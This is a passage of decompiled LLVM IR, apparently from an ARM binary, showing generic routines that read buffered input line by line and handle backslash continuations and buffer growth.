  %v0_155fc = call i32 @function_1095c()
  br label %dec_label_pc_15608

dec_label_pc_15608:                               ; preds = %dec_label_pc_155cc, %dec_label_pc_155fc
  %storemerge2 = phi i32 [ %v0_155cc, %dec_label_pc_155cc ], [ %v0_155fc, %dec_label_pc_155fc ]
  %storemerge = phi i32 [ 20, %dec_label_pc_155cc ], [ 22, %dec_label_pc_155fc ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_15608 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_15608, align 4
  %v0_15628.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15628

dec_label_pc_15610:                               ; preds = %dec_label_pc_155f0
  %v0_15610 = load i32, i32* @r4, align 4
  %v2_15618 = call i32 @function_15424(i32 %v0_15610, i32 %tmp)
  store i32 %v2_15618, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15628

dec_label_pc_15624:                               ; preds = %bb11, %dec_label_pc_155dc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15628

dec_label_pc_15628:                               ; preds = %dec_label_pc_15610, %dec_label_pc_15608, %dec_label_pc_15624
  %v0_15628 = phi i32 [ %v2_15618, %dec_label_pc_15610 ], [ %v0_15628.pre, %dec_label_pc_15608 ], [ 0, %dec_label_pc_15624 ]
  ret i32 %v0_15628

; uselistorder directives
  uselistorder i32 %v2_155e4, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_15424, { 1, 0 }
  uselistorder i32 ()* @function_184a8, { 1, 0 }
  uselistorder label %dec_label_pc_15628, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15624, { 1, 0 }
  uselistorder label %dec_label_pc_15608, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_15638(i32* %arg1) local_unnamed_addr {
dec_label_pc_15638:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 144312, i32* @r6, align 4
  %v1_1564c = add i32 %tmp, 24
  store i32 %v1_1564c, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_15664 = load i32, i32* inttoptr (i32 144388 to i32*), align 4
  store i32 %v4_15664, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15664)
  %v0_15678 = load i32, i32* @r6, align 4
  %v2_15678 = add i32 %v0_15678, 20
  %v3_15678 = inttoptr i32 %v2_15678 to i32*
  %v4_15678 = load i32, i32* %v3_15678, align 4
  store i32 %v4_15678, i32* %ip.global-to-local, align 4
  store i32 87684, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15678)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_15688

dec_label_pc_15688:                               ; preds = %dec_label_pc_156b8, %dec_label_pc_15638
  %v0_15688 = load i32, i32* @r5, align 4
  %v1_15688 = add i32 %v0_15688, 4
  %v2_15688 = inttoptr i32 %v1_15688 to i32*
  %v3_15688 = load i32, i32* %v2_15688, align 4
  %v4_15688 = add i32 %v0_15688, 8
  %v5_15688 = inttoptr i32 %v4_15688 to i32*
  %v6_15688 = load i32, i32* %v5_15688, align 4
  %tmp10 = icmp ugt i32 %v6_15688, %v3_15688
  br i1 %tmp10, label %dec_label_pc_156b8, label %dec_label_pc_15694

dec_label_pc_15694:                               ; preds = %dec_label_pc_15688
  %v1_15694 = inttoptr i32 %v0_15688 to i32*
  %v2_15694 = load i32, i32* %v1_15694, align 4
  %v1_15698 = add i32 %v0_15688, 12
  %v2_15698 = inttoptr i32 %v1_15698 to i32*
  %v3_15698 = load i32, i32* %v2_15698, align 4
  %v1_1569c = add i32 %v0_15688, 20
  %v2_1569c = inttoptr i32 %v1_1569c to i32*
  %v3_1569c = load i32, i32* %v2_1569c, align 4
  %v4_156a0 = inttoptr i32 %v3_15698 to i32*
  %v5_156a0 = call i32 @function_18770(i32 %v2_15694, i32* %v4_156a0, i32 %v3_1569c, i32 %v6_15688)
  %tmp9 = icmp slt i32 %v5_156a0, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_156b0

.thread:                                          ; preds = %dec_label_pc_15694
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_156e8

dec_label_pc_156b0:                               ; preds = %dec_label_pc_15694
  %v1_156b0 = load i32, i32* @r5, align 4
  %v2_156b0 = add i32 %v1_156b0, 8
  %v3_156b0 = inttoptr i32 %v2_156b0 to i32*
  store i32 %v5_156a0, i32* %v3_156b0, align 4
  %v0_156b4 = load i32, i32* @r7, align 4
  %v1_156b4 = load i32, i32* @r5, align 4
  %v2_156b4 = add i32 %v1_156b4, 4
  %v3_156b4 = inttoptr i32 %v2_156b4 to i32*
  store i32 %v0_156b4, i32* %v3_156b4, align 4
  %v0_156b8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_156b8

dec_label_pc_156b8:                               ; preds = %dec_label_pc_15688, %dec_label_pc_156b0
  %v1_156dc = phi i32 [ %v0_15688, %dec_label_pc_15688 ], [ %v0_156b8.pre, %dec_label_pc_156b0 ]
  %v1_156b8 = add i32 %v1_156dc, 4
  %v2_156b8 = inttoptr i32 %v1_156b8 to i32*
  %v3_156b8 = load i32, i32* %v2_156b8, align 4
  %v1_156bc = add i32 %v1_156dc, 12
  %v2_156bc = inttoptr i32 %v1_156bc to i32*
  %v3_156bc = load i32, i32* %v2_156bc, align 4
  %v2_156c0 = add i32 %v3_156bc, %v3_156b8
  store i32 %v2_156c0, i32* @r4, align 4
  %v3_156c4 = inttoptr i32 %v2_156c0 to i32*
  %v4_156c4 = load i32, i32* %v3_156c4, align 4
  %v1_156c8 = add i32 %v2_156c0, 4
  %v2_156c8 = inttoptr i32 %v1_156c8 to i32*
  %v3_156c8 = load i32, i32* %v2_156c8, align 4
  %v1_156cc = add i32 %v2_156c0, 16
  %v2_156cc = inttoptr i32 %v1_156cc to i16*
  %v3_156cc = load i16, i16* %v2_156cc, align 2
  %v4_156cc = zext i16 %v3_156cc to i32
  %v1_156d0 = add i32 %v2_156c0, 8
  %v2_156d0 = inttoptr i32 %v1_156d0 to i32*
  %v3_156d0 = load i32, i32* %v2_156d0, align 4
  store i32 %v3_156d0, i32* %ip.global-to-local, align 4
  %v2_156d4 = add i32 %v4_156cc, %v3_156b8
  %v2_156d8 = or i32 %v3_156c8, %v4_156c4
  %v4_156d8 = icmp eq i32 %v2_156d8, 0
  store i32 %v2_156d4, i32* %v2_156b8, align 4
  %v0_156e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_156e0 = load i32, i32* @r5, align 4
  %v2_156e0 = add i32 %v1_156e0, 16
  %v3_156e0 = inttoptr i32 %v2_156e0 to i32*
  store i32 %v0_156e0, i32* %v3_156e0, align 4
  br i1 %v4_156d8, label %dec_label_pc_15688, label %dec_label_pc_156e8

dec_label_pc_156e8:                               ; preds = %dec_label_pc_156b8, %.thread
  %v0_156f4 = load i32, i32* @r6, align 4
  %v2_156f4 = add i32 %v0_156f4, 28
  %v3_156f4 = inttoptr i32 %v2_156f4 to i32*
  %v4_156f4 = load i32, i32* %v3_156f4, align 4
  store i32 %v4_156f4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_156f4)
  %v0_15700 = load i32, i32* @r4, align 4
  ret i32 %v0_15700

; uselistorder directives
  uselistorder i32 %v2_156c0, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_156dc, { 1, 0 }
  uselistorder i32 %v6_15688, { 1, 0 }
  uselistorder i32 %v0_15688, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_156b8, { 1, 0 }
}

define i32 @function_15714(i32 %arg1) local_unnamed_addr {
dec_label_pc_15714:
  %v0_15714 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15714, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15714
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15714, %bb
  %v10_15720 = phi i32 [ %arg1, %dec_label_pc_15714 ], [ 0, %bb ]
  ret i32 %v10_15720

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_15724(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15724:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_15724 = load i32, i32* @r4, align 4
  %v6_15724 = load i32, i32* @r5, align 4
  %v9_15724 = load i32, i32* @r6, align 4
  %v12_15724 = load i32, i32* @r7, align 4
  %v15_15724 = load i32, i32* @r8, align 4
  %v18_15724 = load i32, i32* @sb, align 4
  %v21_15724 = load i32, i32* @sl, align 4
  %v24_15724 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_15728 = icmp eq i32* %arg1, null
  store i1 %v2_15728, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_15728, label %dec_label_pc_15a38, label %dec_label_pc_15740

dec_label_pc_15740:                               ; preds = %dec_label_pc_15724
  %v1_15740 = urem i32 %arg3, 256
  store i32 %v1_15740, i32* @sb, align 4
  %v1_15744 = udiv i32 %arg3, 256
  %v3_15748 = urem i32 %v1_15744, 256
  %v3_1574c = mul nuw nsw i32 %v1_15740, 4
  %v1_15754 = or i32 %v3_1574c, 1
  %v1_15760 = and i32 %arg3, 131072
  %v1_15764 = add nsw i32 %v1_15740, -1
  %v1_15770 = and i32 %arg3, 262144
  store i32 %v1_15770, i32* %r2.global-to-local, align 4
  %v1_15774 = and i32 %arg3, 65536
  store i32 %v1_15774, i32* %r3.global-to-local, align 4
  store i32 %v1_15774, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_15784 = add i32 %arg4, 1
  store i32 %v1_15784, i32* @sl, align 4
  %v2_15904 = inttoptr i32 %arg2 to i32*
  %v2_15914 = icmp eq i32 %v1_15760, 0
  %v2_1596c = icmp eq i32 %v1_15770, 0
  br label %dec_label_pc_15788

dec_label_pc_15788:                               ; preds = %dec_label_pc_15788.backedge, %dec_label_pc_15740
  %v2_157a4 = phi i32 [ %v0_15788.pre, %dec_label_pc_15788.backedge ], [ %tmp, %dec_label_pc_15740 ]
  %v1_15788 = add i32 %v2_157a4, 4
  %v2_15788 = inttoptr i32 %v1_15788 to i32*
  %v3_15788 = load i32, i32* %v2_15788, align 4
  store i32 %v3_15788, i32* %r3.global-to-local, align 4
  %v2_1578c = icmp eq i32 %v3_15788, 0
  store i1 %v2_1578c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1578c, label %dec_label_pc_15794, label %dec_label_pc_157dc

dec_label_pc_15794:                               ; preds = %dec_label_pc_15788
  %v1_15794 = add i32 %v2_157a4, 16
  %v2_15794 = inttoptr i32 %v1_15794 to i32*
  %v3_15794 = load i32, i32* %v2_15794, align 4
  store i32 %v3_15794, i32* %r3.global-to-local, align 4
  %v2_15798 = icmp eq i32 %v3_15794, 0
  store i1 %v2_15798, i1* %cpsr_z.global-to-local, align 1
  %v1_1579c = add i32 %v2_157a4, 8
  %v2_1579c = inttoptr i32 %v1_1579c to i32*
  %v3_1579c = load i32, i32* %v2_1579c, align 4
  store i32 %v3_1579c, i32* %r3.global-to-local, align 4
  br i1 %v2_15798, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_15794
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_15794, align 4
  %v0_157a8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_15794, %bb
  %v0_157a8 = phi i32 [ %v0_157a8.pre, %bb ], [ %v3_1579c, %dec_label_pc_15794 ]
  %v2_157a8 = icmp eq i32 %v0_157a8, 0
  store i1 %v2_157a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_157a8, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_15754, i32* %r3.global-to-local, align 4
  %v2_157b0 = load i32, i32* @r5, align 4
  %v3_157b0 = add i32 %v2_157b0, 8
  %v4_157b0 = inttoptr i32 %v3_157b0 to i32*
  store i32 %v1_15754, i32* %v4_157b0, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_157b4 = load i32, i32* @r5, align 4
  %v1_157b4 = add i32 %v0_157b4, 16
  %v2_157b4 = inttoptr i32 %v1_157b4 to i32*
  %v3_157b4 = load i32, i32* %v2_157b4, align 4
  store i32 %v3_157b4, i32* %r0.global-to-local, align 4
  %v1_157b8 = add i32 %v0_157b4, 8
  %v2_157b8 = inttoptr i32 %v1_157b8 to i32*
  %v3_157b8 = load i32, i32* %v2_157b8, align 4
  store i32 %v3_157b8, i32* %r3.global-to-local, align 4
  %v2_157bc = add i32 %v3_157b8, %v3_157b4
  store i32 %v2_157bc, i32* %r0.global-to-local, align 4
  %v1_157c0 = call i32 @function_12b00(i32 %v2_157bc)
  store i32 %v1_157c0, i32* %r0.global-to-local, align 4
  %v2_157c4 = icmp eq i32 %v1_157c0, 0
  store i1 %v2_157c4, i1* %cpsr_z.global-to-local, align 1
  %v1_157c8 = load i32, i32* @r5, align 4
  %v2_157c8 = add i32 %v1_157c8, 4
  %v3_157c8 = inttoptr i32 %v2_157c8 to i32*
  store i32 %v1_157c0, i32* %v3_157c8, align 4
  br i1 %v2_157c4, label %dec_label_pc_15a38, label %dec_label_pc_157d0

dec_label_pc_157d0:                               ; preds = %.thread
  %v0_157d0 = load i32, i32* @r5, align 4
  %v1_157d0 = add i32 %v0_157d0, 20
  %v2_157d0 = inttoptr i32 %v1_157d0 to i32*
  %v3_157d0 = load i32, i32* %v2_157d0, align 4
  %v1_157d4 = or i32 %v3_157d0, 1
  store i32 %v1_157d4, i32* %r3.global-to-local, align 4
  store i32 %v1_157d4, i32* %v2_157d0, align 4
  %v0_157dc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_157dc

dec_label_pc_157dc:                               ; preds = %dec_label_pc_15788, %dec_label_pc_157d0
  %v1_157e4 = phi i32 [ %v2_157a4, %dec_label_pc_15788 ], [ %v0_157dc.pre, %dec_label_pc_157d0 ]
  %v1_157dc = add i32 %v1_157e4, 4
  %v2_157dc = inttoptr i32 %v1_157dc to i32*
  %v3_157dc = load i32, i32* %v2_157dc, align 4
  store i32 %v3_157dc, i32* %r2.global-to-local, align 4
  %v4_157dc = add i32 %v1_157e4, 8
  %v5_157dc = inttoptr i32 %v4_157dc to i32*
  %v6_157dc = load i32, i32* %v5_157dc, align 4
  %v2_157e0 = add i32 %v6_157dc, %v3_157dc
  store i32 %v2_157e0, i32* %r3.global-to-local, align 4
  %v2_157e4 = add i32 %v1_157e4, 12
  %v3_157e4 = inttoptr i32 %v2_157e4 to i32*
  store i32 %v2_157e0, i32* %v3_157e4, align 4
  %v0_157e8 = load i32, i32* @fp, align 4
  store i32 %v0_157e8, i32* @r6, align 4
  br label %dec_label_pc_157ec

dec_label_pc_157ec:                               ; preds = %dec_label_pc_15878, %dec_label_pc_15864, %dec_label_pc_157dc
  %v0_157f4 = phi i32 [ %v0_157e8, %dec_label_pc_157dc ], [ %v1_15864, %dec_label_pc_15864 ], [ %v0_157f4.pre.pre, %dec_label_pc_15878 ]
  %v0_157ec = load i32, i32* @r5, align 4
  %v1_157ec = add i32 %v0_157ec, 12
  store i32 %v1_157ec, i32* %r0.global-to-local, align 4
  %v1_157f0 = inttoptr i32 %v1_157ec to i32*
  %v2_157f0 = load i32, i32* %v1_157f0, align 4
  store i32 %v2_157f0, i32* %r0.global-to-local, align 4
  %v3_157f0 = add i32 %v0_157ec, 16
  %v4_157f0 = inttoptr i32 %v3_157f0 to i32*
  %v5_157f0 = load i32, i32* %v4_157f0, align 4
  %v2_157f4 = add i32 %v2_157f0, %v0_157f4
  store i32 %v2_157f4, i32* %r0.global-to-local, align 4
  %v2_157f8 = sub i32 %v5_157f0, %v0_157f4
  %v1_157fc = inttoptr i32 %v0_157ec to i32*
  %v2_157fc = load i32, i32* %v1_157fc, align 4
  store i32 %v2_157fc, i32* %r2.global-to-local, align 4
  %v3_15800 = call i32 @function_16e58(i32 %v2_157f4, i32 %v2_157f8, i32 %v2_157fc)
  store i32 %v3_15800, i32* %r0.global-to-local, align 4
  store i32 %v3_15800, i32* %r4.global-to-local, align 4
  %v2_15804 = icmp eq i32 %v3_15800, 0
  store i1 %v2_15804, i1* %cpsr_z.global-to-local, align 1
  %v0_1580c = load i32, i32* @r5, align 4
  %v1_1580c = add i32 %v0_1580c, 12
  br i1 %v2_15804, label %dec_label_pc_1580c, label %dec_label_pc_15824

dec_label_pc_1580c:                               ; preds = %dec_label_pc_157ec
  store i32 %v1_1580c, i32* %r0.global-to-local, align 4
  %v1_15810 = inttoptr i32 %v1_1580c to i32*
  %v2_15810 = load i32, i32* %v1_15810, align 4
  store i32 %v2_15810, i32* %r0.global-to-local, align 4
  %v3_15810 = add i32 %v0_1580c, 16
  %v4_15810 = inttoptr i32 %v3_15810 to i32*
  %v5_15810 = load i32, i32* %v4_15810, align 4
  store i32 %v5_15810, i32* @r2, align 4
  %v2_15818 = inttoptr i32 %v2_15810 to i8*
  %v3_15818 = call i32 @function_11f30(i8* %v2_15818, i32 0)
  store i32 %v3_15818, i32* %r0.global-to-local, align 4
  %v0_1581c = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15a3c

dec_label_pc_15824:                               ; preds = %dec_label_pc_157ec
  %v2_15824 = inttoptr i32 %v1_1580c to i32*
  %v3_15824 = load i32, i32* %v2_15824, align 4
  store i32 %v3_15824, i32* @r4, align 4
  %v1_15828 = load i32, i32* @r6, align 4
  %v2_15828 = add i32 %v1_15828, %v3_15824
  store i32 %v2_15828, i32* @r0, align 4
  %v0_1582c = call i32 @function_11fd0()
  %v0_15834 = load i32, i32* @r6, align 4
  %v2_15834 = add i32 %v0_15834, %v0_1582c
  store i32 %v2_15834, i32* @r6, align 4
  %v0_15838 = load i32, i32* @r4, align 4
  store i32 %v0_15838, i32* @r0, align 4
  %v2_1583c = call i32 @function_12308(i32 %v0_15838, i32 10)
  store i32 %v2_1583c, i32* %r0.global-to-local, align 4
  %v2_15840 = icmp eq i32 %v2_1583c, 0
  store i1 %v2_15840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15840, label %dec_label_pc_1586c, label %dec_label_pc_15848

dec_label_pc_15848:                               ; preds = %dec_label_pc_15824
  %v1_15848 = inttoptr i32 %v2_1583c to i8*
  %v2_15848 = load i8, i8* %v1_15848, align 1
  %v3_15848 = zext i8 %v2_15848 to i32
  %v1_1584c = add nuw nsw i32 %v3_15848, 255
  %v1_15850 = urem i32 %v1_1584c, 256
  store i32 %v1_15850, i32* %r3.global-to-local, align 4
  %v7_15854 = icmp eq i32 %v1_15850, 92
  store i1 %v7_15854, i1* %cpsr_z.global-to-local, align 1
  %v1_15858 = trunc i32 %v1_1584c to i8
  store i8 %v1_15858, i8* %v1_15848, align 1
  %v0_1585c = load i32, i32* @r6, align 4
  %v1_1585c = add i32 %v0_1585c, -1
  store i32 %v1_1585c, i32* @r6, align 4
  %v0_15860 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15860, label %dec_label_pc_15864, label %dec_label_pc_158f0

dec_label_pc_15864:                               ; preds = %dec_label_pc_15848
  %v1_15864 = add i32 %v0_1585c, -2
  store i32 %v1_15864, i32* @r6, align 4
  br label %dec_label_pc_157ec

dec_label_pc_1586c:                               ; preds = %dec_label_pc_15824
  %v0_1586c = load i32, i32* @r5, align 4
  %v1_1586c = add i32 %v0_1586c, 20
  %v2_1586c = inttoptr i32 %v1_1586c to i32*
  %v3_1586c = load i32, i32* %v2_1586c, align 4
  store i32 %v3_1586c, i32* %r3.global-to-local, align 4
  %v2_15870 = icmp eq i32 %v3_1586c, 0
  store i1 %v2_15870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15870, label %dec_label_pc_158a8, label %dec_label_pc_15878

dec_label_pc_15878:                               ; preds = %dec_label_pc_1586c
  %v1_15878 = add i32 %v0_1586c, 16
  %v2_15878 = inttoptr i32 %v1_15878 to i32*
  %v3_15878 = load i32, i32* %v2_15878, align 4
  store i32 %v3_15878, i32* %r3.global-to-local, align 4
  %v1_1587c = add i32 %v0_1586c, 8
  %v2_1587c = inttoptr i32 %v1_1587c to i32*
  %v3_1587c = load i32, i32* %v2_1587c, align 4
  %v1_15880 = add i32 %v3_15878, 4096
  store i32 %v1_15880, i32* %r3.global-to-local, align 4
  %v2_15884 = add i32 %v3_1587c, %v1_15880
  store i32 %v1_15880, i32* %v2_15878, align 4
  %v0_1588c = load i32, i32* @r5, align 4
  %v1_1588c = add i32 %v0_1588c, 4
  %v2_1588c = inttoptr i32 %v1_1588c to i32*
  %v3_1588c = load i32, i32* %v2_1588c, align 4
  store i32 %v3_1588c, i32* %r0.global-to-local, align 4
  %v2_15890 = inttoptr i32 %v3_1588c to i32*
  %v3_15890 = call i32 @function_18064(i32* %v2_15890, i32 %v2_15884)
  store i32 %v3_15890, i32* %r0.global-to-local, align 4
  %v0_15894 = load i32, i32* @r5, align 4
  %v1_15894 = add i32 %v0_15894, 8
  %v2_15894 = inttoptr i32 %v1_15894 to i32*
  %v3_15894 = load i32, i32* %v2_15894, align 4
  %v2_15898 = add i32 %v3_15894, %v3_15890
  store i32 %v2_15898, i32* %r3.global-to-local, align 4
  %v2_1589c = add i32 %v0_15894, 12
  %v3_1589c = inttoptr i32 %v2_1589c to i32*
  store i32 %v2_15898, i32* %v3_1589c, align 4
  %v1_158a0 = load i32, i32* @r5, align 4
  %v2_158a0 = add i32 %v1_158a0, 4
  %v3_158a0 = inttoptr i32 %v2_158a0 to i32*
  store i32 %v3_15890, i32* %v3_158a0, align 4
  %v0_157f4.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_157ec

dec_label_pc_158a8:                               ; preds = %dec_label_pc_1586c, %.dec_label_pc_158a8_crit_edge
  %v0_158a8 = phi i32 [ %v0_158a8.pre, %.dec_label_pc_158a8_crit_edge ], [ %v0_1586c, %dec_label_pc_1586c ]
  %v1_158a8 = inttoptr i32 %v0_158a8 to i32*
  %v2_158a8 = load i32, i32* %v1_158a8, align 4
  %v1_158ac = add i32 %v2_158a8, 52
  %v2_158ac = inttoptr i32 %v1_158ac to i32*
  %v3_158ac = load i32, i32* %v2_158ac, align 4
  store i32 %v3_158ac, i32* %r3.global-to-local, align 4
  %v2_158b0 = icmp eq i32 %v3_158ac, 0
  store i1 %v2_158b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_158b0, label %dec_label_pc_158dc, label %dec_label_pc_158b8

dec_label_pc_158b8:                               ; preds = %dec_label_pc_158a8
  %v1_158b8 = add i32 %v2_158a8, 16
  %v2_158b8 = inttoptr i32 %v1_158b8 to i32*
  %v3_158b8 = load i32, i32* %v2_158b8, align 4
  store i32 %v3_158b8, i32* %r2.global-to-local, align 4
  %v1_158bc = add i32 %v2_158a8, 24
  %v2_158bc = inttoptr i32 %v1_158bc to i32*
  %v3_158bc = load i32, i32* %v2_158bc, align 4
  store i32 %v3_158bc, i32* %r3.global-to-local, align 4
  %v3_158c0 = icmp ult i32 %v3_158b8, %v3_158bc
  %v9_158c0 = icmp eq i32 %v3_158b8, %v3_158bc
  store i1 %v9_158c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_158c0, label %dec_label_pc_158e4thread-pre-split, label %dec_label_pc_158d0

dec_label_pc_158d0:                               ; preds = %dec_label_pc_158b8
  store i32 %v2_158a8, i32* %r0.global-to-local, align 4
  %v1_158d4 = inttoptr i32 %v2_158a8 to i16*
  %v2_158d4 = call i32 @function_172a8(i16* %v1_158d4)
  store i32 %v2_158d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_158e4

dec_label_pc_158dc:                               ; preds = %dec_label_pc_158a8
  store i32 %v2_158a8, i32* %r0.global-to-local, align 4
  %v1_158e0 = call i32 @function_16d7c(i32 %v2_158a8)
  store i32 %v1_158e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_158e4

dec_label_pc_158e4thread-pre-split:               ; preds = %dec_label_pc_158b8
  %v2_158c4 = inttoptr i32 %v3_158b8 to i8*
  %v3_158c4 = load i8, i8* %v2_158c4, align 1
  %v4_158c4 = zext i8 %v3_158c4 to i32
  store i32 %v4_158c4, i32* %r0.global-to-local, align 4
  %v6_158c4 = add i32 %v3_158b8, 1
  store i32 %v6_158c4, i32* %r2.global-to-local, align 4
  store i32 %v6_158c4, i32* %v2_158b8, align 4
  %v0_158e4.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_158e4

dec_label_pc_158e4:                               ; preds = %dec_label_pc_158e4thread-pre-split, %dec_label_pc_158d0, %dec_label_pc_158dc
  %v1_158e8 = phi i32 [ %v0_158e4.pr, %dec_label_pc_158e4thread-pre-split ], [ %v2_158d4, %dec_label_pc_158d0 ], [ %v1_158e0, %dec_label_pc_158dc ]
  %v7_158e4 = icmp eq i32 %v1_158e8, 10
  store i1 %v7_158e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_158e4, label %dec_label_pc_158f0.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_158e4
  %v8_158e8 = icmp eq i32 %v1_158e8, -1
  store i1 %v8_158e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_158e8, label %dec_label_pc_158f0.loopexit, label %.dec_label_pc_158a8_crit_edge

.dec_label_pc_158a8_crit_edge:                    ; preds = %bb68
  %v0_158a8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_158a8

dec_label_pc_158f0.loopexit:                      ; preds = %bb68, %dec_label_pc_158e4
  %v0_158f0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_158f0

dec_label_pc_158f0:                               ; preds = %dec_label_pc_15848, %dec_label_pc_158f0.loopexit
  %v0_158f0 = phi i32 [ %v0_158f0.pre, %dec_label_pc_158f0.loopexit ], [ %v1_1585c, %dec_label_pc_15848 ]
  %v7_158f0 = icmp eq i32 %v0_158f0, -1
  store i1 %v7_158f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_158f0, label %dec_label_pc_15a38, label %dec_label_pc_158f8

dec_label_pc_158f8:                               ; preds = %dec_label_pc_158f0
  %v0_158f8 = load i32, i32* @r5, align 4
  %v1_158f8 = add i32 %v0_158f8, 4
  %v2_158f8 = inttoptr i32 %v1_158f8 to i32*
  %v3_158f8 = load i32, i32* %v2_158f8, align 4
  store i32 %v3_158f8, i32* %r0.global-to-local, align 4
  store i32 %v3_1574c, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_158f8, i32* %v2_15904, align 4
  %v0_15908 = load i32, i32* @fp, align 4
  %v2_1590c = inttoptr i32 %v3_158f8 to i8*
  %v3_1590c = call i32 @function_11f30(i8* %v2_1590c, i32 %v0_15908)
  store i32 %v3_1590c, i32* %r0.global-to-local, align 4
  store i32 %v1_15760, i32* %r2.global-to-local, align 4
  store i1 %v2_15914, i1* %cpsr_z.global-to-local, align 1
  %v0_15918 = load i32, i32* @r5, align 4
  %v1_15918 = add i32 %v0_15918, 12
  %v2_15918 = inttoptr i32 %v1_15918 to i32*
  %v3_15918 = load i32, i32* %v2_15918, align 4
  store i32 %v3_15918, i32* @r4, align 4
  br i1 %v2_15914, label %dec_label_pc_15930, label %dec_label_pc_15920

dec_label_pc_15920:                               ; preds = %dec_label_pc_158f8
  store i32 %v3_15918, i32* @r0, align 4
  %v1_15928 = inttoptr i32 %v3_15918 to i8*
  %v2_15928 = call i32 @function_17c4c(i8* %v1_15928)
  store i32 %v2_15928, i32* %r0.global-to-local, align 4
  %v0_1592c = load i32, i32* @r4, align 4
  %v2_1592c = add i32 %v0_1592c, %v2_15928
  store i32 %v2_1592c, i32* @r4, align 4
  br label %dec_label_pc_15930

dec_label_pc_15930:                               ; preds = %dec_label_pc_158f8, %dec_label_pc_15920
  %v0_15a0813 = phi i32 [ %v3_15918, %dec_label_pc_158f8 ], [ %v2_1592c, %dec_label_pc_15920 ]
  %v1_15930 = inttoptr i32 %v0_15a0813 to i8*
  %v2_15930 = load i8, i8* %v1_15930, align 1
  %v3_15930 = zext i8 %v2_15930 to i32
  store i32 %v3_15930, i32* %r2.global-to-local, align 4
  %v2_15934 = icmp eq i8 %v2_15930, 0
  store i1 %v2_15934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15934, label %dec_label_pc_15788.backedge, label %dec_label_pc_1593c

dec_label_pc_15788.backedge:                      ; preds = %dec_label_pc_15930, %dec_label_pc_15a30, %dec_label_pc_1593c
  %v0_15788.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15788

dec_label_pc_1593c:                               ; preds = %dec_label_pc_15930
  %v0_1593c = load i32, i32* @r7, align 4
  %v1_1593c = inttoptr i32 %v0_1593c to i8*
  %v2_1593c = load i8, i8* %v1_1593c, align 1
  %v3_1593c = zext i8 %v2_1593c to i32
  store i32 %v3_1593c, i32* %r3.global-to-local, align 4
  %v9_15940 = icmp eq i8 %v2_1593c, %v2_15930
  store i1 %v9_15940, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15940, label %dec_label_pc_15788.backedge, label %dec_label_pc_15a08.preheader

dec_label_pc_15a08.preheader:                     ; preds = %dec_label_pc_1593c
